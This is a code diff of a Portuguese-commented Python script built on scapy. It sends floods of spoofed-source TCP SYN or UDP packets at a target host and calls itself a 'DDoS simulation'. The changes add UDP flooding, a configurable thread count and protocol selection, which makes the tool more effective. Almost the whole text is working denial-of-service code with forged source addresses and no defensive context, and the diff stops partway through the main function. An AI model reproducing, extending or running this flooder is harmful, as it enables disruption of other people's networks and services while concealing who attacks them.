@@ -1,52 +1,55 @@
 import argparse
-import threading
 import socket
+import threading
 from scapy.all import *
 
-def send_packet(target_ip, fake_ip, port=80):
-    try:
-        # Construir o pacote TCP com IP falsificado
-        packet = IP(src=fake_ip, dst=target_ip)/TCP(dport=port, flags="S")
-        # Enviar pacote usando send function do scapy
-        send(packet, verbose=0)
-    except Exception as e:
-        print(f"Erro ao enviar pacote: {e}")
+def send_tcp_packet(target_ip, fake_ip, port):
+    packet = IP(src=fake_ip, dst=target_ip) / TCP(dport=port, flags="S")
+    send(packet, verbose=0)
 
-def attack(target_ip, fake_ip, num_packets, port=80):
-    print(f"Iniciando envio de {num_packets} pacotes TCP/IP do IP falso {fake_ip} para {target_ip}:{port}...")
+def send_udp_packet(target_ip, fake_ip, port):
+    packet = IP(src=fake_ip, dst=target_ip) / UDP(dport=port)
+    send(packet, verbose=0)
 
-    try:
-        # Enviar múltiplos pacotes usando scapy
-        for _ in range(num_packets):
-            send_packet(target_ip, fake_ip, port)
-    except KeyboardInterrupt:
-        print("\nEnvio de pacotes interrompido.")
+def attack(target_ip, fake_ip, num_packets, port, protocol):
+    print(f"Iniciando ataque {protocol.upper()} com {num_packets} pacotes do IP falso {fake_ip} para {target_ip}:{port}...")
+
+    for _ in range(num_packets):
+        if protocol == "tcp":
+            send_tcp_packet(target_ip, fake_ip, port)
+        elif protocol == "udp":
+            send_udp_packet(target_ip, fake_ip, port)
+        else:
+            print(f"Protocolo {protocol} não suportado")
+            break
 
 def main():
-    parser = argparse.ArgumentParser(description="Simulação de ataque DDoS com pacotes TCP/IP")
+    parser = argparse.ArgumentParser(description="Simulação de ataque DDoS com pacotes TCP/UDP")
     parser.add_argument("target", help="IP do roteador ou URL do site")
     parser.add_argument("fake_ip", help="IP falso para disfarçar a origem dos pacotes")
-    parser.add_argument("-c", "--count", type=int, default=1000, help="Número de pacotes a enviar (padrão é 1000)")
     parser.add_argument("-p", "--port", type=int, default=80, help="Porta do servidor alvo (padrão é 80)")
+    parser.add_argument("-c", "--count", type=int, default=1000, help="Número de pacotes a enviar (padrão é 1000)")
+    parser.add_argument("-t", "--threads", type=int, default=10, help="Número de threads para enviar pacotes (padrão é 10)")
+    parser.add_argument("--protocol", choices=["tcp", "udp"], default="tcp", help="Protocolo a ser usado (tcp ou udp, padrão é tcp)")
     args = parser.parse_args()
 
     target = args.target
     fake_ip = args.fake_ip
-    num_packets = args.count
     port = args.port
+    num_packets = args.count
+    num_threads = args.threads
+    protocol = args.protocol
 
-    # Resolver o nome do site para obter o IP se necessário
     try:
         target_ip = socket.gethostbyname(target)
     except socket.gaierror as e:
         print(f"Erro ao resolver o nome do site {target}: {e}")
         return
 
-    # Utilizar threads para enviar pacotes de forma concorrente
     threads = []
     try:
-        for _ in range(10):  # Número de threads pode ser ajustado
-            thread = threading.Thread(target=attack, args=(target_ip, fake_ip, num_packets, port))
+        for _ in range(num_threads):
+            thread = threading.Thread(target=attack, args=(target_ip, fake_ip, num_packets, port, protocol))
             threads.append(thread)
             thread.start()
 
